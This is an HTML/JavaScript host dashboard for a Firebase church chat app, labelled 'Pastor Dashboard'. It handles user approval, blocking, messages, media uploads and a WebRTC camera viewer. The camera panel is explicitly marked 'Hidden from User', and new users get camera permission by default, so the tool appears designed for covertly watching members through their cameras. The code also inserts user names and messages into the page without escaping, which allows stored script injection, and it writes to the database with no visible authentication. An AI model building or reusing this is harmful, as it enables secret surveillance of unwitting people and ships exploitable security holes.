<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Host Dashboard - Advanced</title>
<style>
html {font-size:16px; scroll-behavior:smooth}
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Arial,sans-serif;-webkit-tap-highlight-color:transparent}
body{background:#0f172a;color:white;min-height:100vh;overflow-x:hidden;width:100%;max-width:100vw}
input,textarea,select{font-size:16px!important}

/* HEADER */
.header{background:#1e293b;padding:12px 16px;display:flex;align-items:center;gap:12px;position:sticky;top:0;z-index:200;box-shadow:0 2px 8px rgba(0,0,0,0.4)}
.header h2{font-size:18px;color:#60a5fa;flex:1}
.header button{background:#2563eb;border:none;color:white;padding:8px 14px;border-radius:8px;cursor:pointer;font-size:14px;font-weight:bold}

/* LAYOUT */
.container{display:flex;height:calc(100vh - 56px)}
.sidebar{width:330px;background:#1e293b;border-right:2px solid #0f172a;display:flex;flex-direction:column}
.main{flex:1;display:flex;flex-direction:column;background:#0f172a}

/* UID GENERATOR */
.uid-section{background:#0f172a;padding:12px;border-bottom:2px solid #334155}
.uid-section h3{color:#60a5fa;font-size:15px;margin-bottom:8px}
.uid-box{background:#1e293b;padding:10px;border-radius:8px;font-family:monospace;font-size:13px;word-break:break-all;margin-top:8px}
.btn{padding:8px 12px;border:none;border-radius:8px;background:linear-gradient(135deg,#2563eb 0%,#1d4ed8 100%);color:white;cursor:pointer;font-weight:bold;width:100%;margin-top:6px}

/* USER LIST */
.user-list{flex:1;overflow-y:auto}
.user-card{display:flex;align-items:center;gap:10px;padding:10px 12px;border-bottom:1px solid #334155;cursor:pointer;transition:0.2s}
.user-card:hover{background:#334155}
.user-card.active{background:#334155;border-left:4px solid #2563eb}
.user-card.new{border-left-color:#22c55e}
.user-card.blocked{opacity:0.5;border-left-color:#dc2626}
.user-avatar{width:42px;height:42px;border-radius:50%;background:linear-gradient(135deg,#2563eb,#1d4ed8);display:flex;align-items:center;justify-content:center;font-weight:bold;font-size:16px;flex-shrink:0}
.user-info{flex:1;min-width:0}
.user-name{font-weight:600;font-size:15px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.user-id{font-size:11px;color:#94a3b8;margin-top:2px}
.user-actions{display:flex;gap:4px;flex-wrap:wrap}
.btn-sm{padding:5px 7px;border:none;border-radius:5px;background:#2563eb;color:white;cursor:pointer;font-size:11px}
.btn-sm.accept{background:#16a34a}
.btn-sm.reject{background:#dc2626}
.btn-sm.remove{background:#dc2626}
.btn-sm.restore{background:#16a34a}
.btn-sm.camera{background:#0ea5e9}
.pending-badge{background:#dc2626;color:white;padding:2px 5px;border-radius:8px;font-size:10px;margin-left:4px}

/* CAMERA ON TOP - HOST ONLY */
.video-wrapper{padding:10px;background:#0f172a;border-bottom:2px solid #1e293b}
.video-wrapper h4{color:#22c55e;font-size:14px;margin-bottom:6px}
video{width:100%;height:auto;aspect-ratio:16/9;background:black;border-radius:12px;border:2px solid #334155;object-fit:cover;max-height:220px}

/* CHAT HEADER */
.chat-header{background:#1e293b;padding:10px 16px;border-bottom:2px solid #0f172a;display:flex;align-items:center;gap:10px}
.chat-header.user-avatar{width:38px;height:38px;font-size:16px}
.status-text{font-size:12px;color:#22c55e}

/* CHAT BOX */
.chat-box{flex:1;overflow-y:auto;padding:16px;display:flex;flex-direction:column;gap:8px;background:linear-gradient(rgba(15,23,42,0.95), rgba(15,23,42,0.95)), url('https://images.unsplash.com/photo-1507692049790-de58290a4334?q=80&w=1200') center/cover}

/* MESSAGES */
.message{padding:8px 12px;border-radius:8px;max-width:70%;font-size:15px;position:relative;word-wrap:break-word}
.host{background:#2563eb;margin-left:auto;border-bottom-right-radius:2px}
.user{background:#334155;margin-right:auto;border-bottom-left-radius:2px}
.time-stamp{font-size:10px;color:#cbd5e1;margin-top:4px;text-align:right}
.read-receipt{color:#22c55e;margin-left:4px}
.msg-img{max-width:220px;border-radius:10px;margin-top:5px;display:block;cursor:pointer}
.msg-audio{width:100%;max-width:260px;margin-top:5px}

/* INPUT */
.input-area{display:flex;padding:10px;background:#1e293b;gap:8px;align-items:flex-end;border-top:2px solid #0f172a}
.input-area input{flex:1;padding:10px 14px;border:none;border-radius:24px;background:#0f172a;color:white;font-size:15px}
.input-btn{width:38px;height:38px;border-radius:50%;border:none;background:#2563eb;color:white;cursor:pointer;font-size:17px;display:flex;align-items:center;justify-content:center}
.input-btn.send{background:#22c55e}

/* PERMISSION PANEL ALWAYS VISIBLE */
.permission-panel{background:#0f172a;padding:12px;border-top:2px solid #334155}
.permission-panel h4{font-size:14px;color:#60a5fa;margin-bottom:8px}
.permission-panel label{display:flex;align-items:center;gap:8px;font-size:14px;margin:6px 0;cursor:pointer}
.permission-panel input[type="checkbox"]{width:18px;height:18px}

/* NOTIFICATION */
.notification{position:fixed;top:65px;right:15px;background:linear-gradient(135deg,#22c55e 0%,#16a34a 100%);padding:14px 18px;border-radius:12px;z-index:9999;display:none;box-shadow:0 6px 18px rgba(0,0,0,0.5)}
.notification-title{font-weight:bold;font-size:15px;margin-bottom:3px}
.notification-text{font-size:12px;opacity:0.9}

/* MOBILE */
@media(max-width:768px){
.sidebar{position:fixed;left:-100%;width:100%;z-index:300;transition:0.3s;height:100vh}
.sidebar.active{left:0}
.message{max-width:85%}
video{max-height:180px}
.user-actions{gap:3px}
.btn-sm{padding:4px 6px;font-size:10px}
</style>
</head>
<body>

<div class="header">
    <button id="menuBtn">☰</button>
    <h2>Pastor Dashboard</h2>
    <button id="generateUID">+ Add User</button>
</div>

<div class="notification" id="notification">
    <div class="notification-title">🔔 New User</div>
    <div class="notification-text" id="notifText"></div>
</div>

<div class="container">
    <!-- LEFT SIDEBAR -->
    <div class="sidebar" id="sidebar">
        <div class="uid-section">
            <h3>Generate UID for New User</h3>
            <button class="btn" id="generateBtn">Generate New UID</button>
            <div class="uid-box" id="uidBox">Click to generate</div>
        </div>

        <h3 style="color:#60a5fa;margin:10px 12px;font-size:16px">All Users</h3>
        <div class="user-list" id="users"></div>

        <!-- PERMISSION PANEL ALWAYS VISIBLE -->
        <div class="permission-panel" id="permissionPanel" style="display:none">
            <h4>Permissions: <span id="permUserName"></span></h4>
            <label><input type="checkbox" id="allowMedia"> Allow Images/Audio/Stickers</label>
            <label><input type="checkbox" id="allowCamera"> Allow Camera Access</label>
            <button class="btn-sm accept" onclick="savePermissions()" style="width:100%;margin-top:8px">Save Permissions</button>
        </div>
    </div>

    <!-- RIGHT MAIN -->
    <div class="main">
        <!-- CAMERA ON TOP - HOST SEES USER ONLY -->
        <div class="video-wrapper" id="videoWrapper" style="display:none">
            <h4>👁️ User Camera - Hidden from User</h4>
            <video autoplay playsinline id="remoteVideo"></video>
        </div>

        <!-- CHAT HEADER -->
        <div class="chat-header" id="chatHeader" style="display:none">
            <div class="user-avatar" id="chatAvatar">U</div>
            <div>
                <div class="user-name" id="chatUserName">Select user</div>
                <div class="status-text" id="chatStatus">Offline</div>
            </div>
        </div>

        <!-- CHAT BOX -->
        <div class="chat-box" id="chatBox">
            <div style="text-align:center;padding:60px 20px;color:#64748b">
                <h3>Select a user to start</h3>
            </div>
        </div>

        <!-- INPUT BOTTOM -->
        <div class="input-area" id="inputArea" style="display:none">
            <input type="file" id="fileInput" accept="image/*,audio/*,.html,.txt,.pdf" style="display:none">
            <input type="file" id="stickerInput" accept="image/*" style="display:none">
            <button class="input-btn" onclick="document.getElementById('fileInput').click()">📎</button>
            <button class="input-btn" onclick="document.getElementById('stickerInput').click()">😊</button>
            <button class="input-btn" id="recordBtn">🎤</button>
            <input type="text" id="message" placeholder="Type message">
            <button class="input-btn send" onclick="sendMessage()">➤</button>
        </div>
    </div>
</div>

<audio id="notifSound" src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBTGH0fPTgjMGHm7A7+OZURE" preload="auto"></audio>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
import { getDatabase, ref, push, onChildAdded, set, onValue, get, update, remove } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";

const firebaseConfig = {
 apiKey: "AIzaSyDXeh9GNe3E8L6tE9xMA8fE2OJXCSuhLMY",
  authDomain: "church-project-bfb2d.firebaseapp.com",
  databaseURL: "https://church-project-bfb2d-default-rtdb.firebaseio.com",
  projectId: "church-project-bfb2d",
  storageBucket: "church-project-bfb2d.firebasestorage.app",
  messagingSenderId: "433486920211",
  appId: "1:433486920211:web:8cb750d19c05ce0d1d9de6",
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

let currentUID = null;
let pc = null;
let mediaRecorder = null;
let recordingChunks = [];

document.getElementById("menuBtn").onclick = () => document.getElementById('sidebar').classList.toggle('active');

function showNotification(name, roomId){
    const notif = document.getElementById('notification');
    document.getElementById('notifText').innerHTML = `<b>${name}</b> joined<br><small>Room: ${roomId}</small>`;
    notif.style.display = "block";
    document.getElementById('notifSound').play().catch(()=>{});
    setTimeout(() => notif.style.display = "none", 5000);
}

// GENERATE UID - ADD USER BUTTON
document.getElementById("generateBtn").onclick = function(){
    const uid = 'KKAC_' + Math.random().toString(36).substring(2,10).toUpperCase();
    document.getElementById('uidBox').innerHTML = `<b>UID:</b> ${uid}<br><small>Send to user</small>`;
    set(ref(db, 'users/'+uid), {
        status: 'pending',
        joined: Date.now(),
        blocked: false,
        approved: false,
        permissions: {allowMedia:true, allowCamera:true}
    });
    alert("✅ UID Generated: " + uid);
}

// LOAD ALL USERS WITH ALL BUTTONS
function loadUsers(){
    onValue(ref(db, 'users'), snap => {
        document.getElementById('users').innerHTML = "";
        snap.forEach(child => {
            const uid = child.key;
            const data = child.val();
            if(data.member){
                const isPending = data.status === 'pending' ||!data.approved;
                const isBlocked = data.blocked;
                const div = document.createElement("div");
                div.className = "user-card" + (uid === currentUID? " active" : "") + (isPending? " new" : "") + (isBlocked? " blocked" : "");
                div.dataset.uid = uid;

                let actions = "";

                // CAMERA BUTTON - Always show
                actions += `<button class="btn-sm camera" onclick="viewUserCamera('${uid}')">👁️</button>`;

                if(isPending){
                    // ACCEPT + REJECT BUTTONS
                    actions += `<button class="btn-sm accept" onclick="acceptUser('${uid}')">Accept</button>
                               <button class="btn-sm reject" onclick="rejectUser('${uid}')">Reject</button>`;
                } else if(isBlocked){
                    // RESTORE BUTTON
                    actions += `<button class="btn-sm restore" onclick="restoreUser('${uid}')">Restore</button>`;
                } else {
                    // REMOVE BUTTON
                    actions += `<button class="btn-sm remove" onclick="removeUser('${uid}')">Remove</button>`;
                }

                div.innerHTML = `
                    <div class="user-avatar">${data.member.name.charAt(0).toUpperCase()}</div>
                    <div class="user-info" onclick="openChat('${uid}')">
                        <div class="user-name">${data.member.name} ${isPending? '<span class="pending-badge">New</span>' : ''}</div>
                        <div class="user-id">${uid}</div>
                    </div>
                    <div class="user-actions">${actions}</div>
                `;
                document.getElementById('users').appendChild(div);
            }
        });
    });
}

// ACCEPT USER
window.acceptUser = function(uid){
    update(ref(db, 'users/'+uid), {approved:true, status:'active'});
    alert("✅ User approved");
}

// REJECT USER
window.rejectUser = function(uid){
    if(confirm("Reject this user?")){
        update(ref(db, 'users/'+uid), {blocked:true, approved:false});
        alert("⛔ User rejected");
    }
}

// REMOVE/BLOCK USER
window.removeUser = function(uid){
    if(confirm("Remove this user? They will be kicked out.")){
        update(ref(db, 'users/'+uid), {blocked:true});
        alert("⛔ User removed");
    }
}

// RESTORE/UNBLOCK USER
window.restoreUser = function(uid){
    update(ref(db, 'users/'+uid), {blocked:false});
    alert("♻️ User restored");
}

// VIEW USER CAMERA - HOST ONLY
window.viewUserCamera = function(uid){
    openChat(uid);
    startWebRTC(uid);
    document.getElementById('videoWrapper').style.display = 'block';
}

// OPEN CHAT
window.openChat = async function(uid){
    currentUID = uid;
    document.getElementById('sidebar').classList.remove('active');

    const userSnap = await get(ref(db, 'users/'+uid));
    const userData = userSnap.val();

    document.getElementById('chatHeader').style.display = 'flex';
    document.getElementById('inputArea').style.display = 'flex';
    document.getElementById('chatUserName').textContent = userData.member.name;
    document.getElementById('chatAvatar').textContent = userData.member.name.charAt(0).toUpperCase();
    document.getElementById('chatStatus').textContent = userData.member.online? 'Online' : 'Offline';

    // PERMISSION PANEL ALWAYS SHOW
    document.getElementById('permissionPanel').style.display = 'block';
    document.getElementById('permUserName').textContent = userData.member.name;
    document.getElementById('allowMedia').checked = userData.permissions?.allowMedia;
    document.getElementById('allowCamera').checked = userData.permissions?.allowCamera;

    // LOAD MESSAGES
    document.getElementById('chatBox').innerHTML = "";
    onChildAdded(ref(db, 'chats/'+uid), snap => {
        const m = snap.val();
        if(!document.getElementById('msg-'+snap.key)){
            addMessage(m, snap.key);
            if(m.sender!== "Host" &&!m.readBy){
                update(ref(db, 'chats/'+uid+'/'+snap.key), {readBy: "Host"});
                showNotification(m.sender, uid);
            }
        }
    });

    document.querySelectorAll(`[data-uid="${uid}"]`).forEach(el => el.classList.remove('new'));
}

// SAVE PERMISSIONS
window.savePermissions = function(){
    if(!currentUID) return;
    const perms = {
        allowMedia: document.getElementById('allowMedia').checked,
        allowCamera: document.getElementById('allowCamera').checked
    };
    set(ref(db, 'users/'+currentUID+'/permissions'), perms);
    alert("Permissions saved");
}

function addMessage(m, msgId){
    if(document.getElementById('msg-'+msgId)) return;
    const div = document.createElement("div");
    div.className = `message ${m.type}`;
    div.id = 'msg-'+msgId;

    let content = m.message || '';
    if(m.image) content += `<br><img src="${m.image}" class="msg-img" onclick="window.open('${m.image}')">`;
    if(m.audio) content += `<br><audio controls class="msg-audio"><source src="${m.audio}"></audio>`;

    let receipt = m.type === 'host'? (m.readBy? '<span class="read-receipt">✓</span>' : '<span>✓</span>') : '';
    const timestamp = new Date(m.time).toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit'});

    div.innerHTML = content + `<div class="time-stamp">${timestamp}${receipt}</div>`;
    document.getElementById('chatBox').appendChild(div);
    document.getElementById('chatBox').scrollTop = document.getElementById('chatBox').scrollHeight;
}

window.sendMessage = function(){
    const input = document.getElementById("message");
    const msg = input.value.trim();
    if(!msg ||!currentUID) return;
    push(ref(db, 'chats/'+currentUID), {
        sender:"Host", message:msg, type:"host", time:Date.now(), readBy: null
    });
    input.value = "";
}

// WEBRTC - HOST SEES USER CAMERA ONLY
async function startWebRTC(uid){
    if(pc) {
        pc.close();
        pc = null;
    }

    pc = new RTCPeerConnection({iceServers: [
        {urls: 'stun:stun.l.google.com:19302'},
        {urls: 'stun:stun1.l.google.com:19302'}
    ]});

    pc.ontrack = e => {
        console.log("Remote stream received");
        document.getElementById('remoteVideo').srcObject = e.streams[0];
    };

    pc.onicecandidate = e => {
        if(e.candidate) {
            push(ref(db, 'signals/'+uid+'/candidate/host'), e.candidate.toJSON());
        }
    };

    onValue(ref(db, 'signals/'+uid+'/offer'), async snap => {
        if(snap.exists() &&!pc.currentRemoteDescription){
            await pc.setRemoteDescription(snap.val());
            const answer = await pc.createAnswer();
            await pc.setLocalDescription(answer);
            set(ref(db, 'signals/'+uid+'/answer'), answer);
        }
    });

    onChildAdded(ref(db, 'signals/'+uid+'/candidate/member'), snap => {
        if(pc && snap.val()) pc.addIceCandidate(new RTCIceCandidate(snap.val()));
    });
}

// FILE + STICKER + VOICE
document.getElementById("fileInput").onchange = function(e){
    const file = e.target.files[0];
    if(!file ||!currentUID) return;
    const reader = new FileReader();
    reader.onload = evt => {
        const msgData = {sender: "Host", type: "host", time: Date.now(), readBy: null};
        if(file.type.startsWith('image/')){msgData.image = evt.target.result;}
        else if(file.type.startsWith('audio/')){msgData.audio = evt.target.result;}
        else{msgData.file = {name: file.name, size: Math.round(file.size/1024), url: evt.target.result};}
        push(ref(db, 'chats/'+currentUID), msgData);
    };
    reader.readAsDataURL(file);
}

document.getElementById("stickerInput").onchange = function(e){
    const file = e.target.files[0];
    if(!file ||!currentUID) return;
    const reader = new FileReader();
    reader.onload = evt => {
        push(ref(db, 'chats/'+currentUID), {
            sender: "Host", sticker: evt.target.result, type: "host", time: Date.now(), readBy: null
        });
    };
    reader.readAsDataURL(file);
}

document.getElementById("recordBtn").onclick = async function(){
    if(!currentUID) return alert("Select user first");
    if(mediaRecorder && mediaRecorder.state === "recording"){
        mediaRecorder.stop();
        this.textContent = "🎤";
        return;
    }
    try {
       const stream = await navigator.mediaDevices.getUserMedia({audio:true});
        mediaRecorder = new MediaRecorder(stream);
        recordingChunks = [];
        mediaRecorder.ondataavailable = e => recordingChunks.push(e.data);
        mediaRecorder.onstop = () => {
            const blob = new Blob(recordingChunks, {type: 'audio/webm'});
            const reader = new FileReader();
            reader.onload = () => {
                push(ref(db, 'chats/'+currentUID), {
                    sender: "Host", audio: reader.result, type: "host", time: Date.now(), readBy: null
                });
            };
            reader.readAsDataURL(blob);
        };
        mediaRecorder.start();
        this.textContent = "⏹️";
        setTimeout(() => {
            if(mediaRecorder.state === "recording"){
                mediaRecorder.stop();
                this.textContent = "🎤";
            }
        }, 30000);
    } catch(err){
        alert("Mic error: " + err.message);
    }
}

loadUsers();
document.getElementById('message').addEventListener('keypress', e => {
    if(e.key === 'Enter') sendMessage();
});
</script>
</body>
</html>
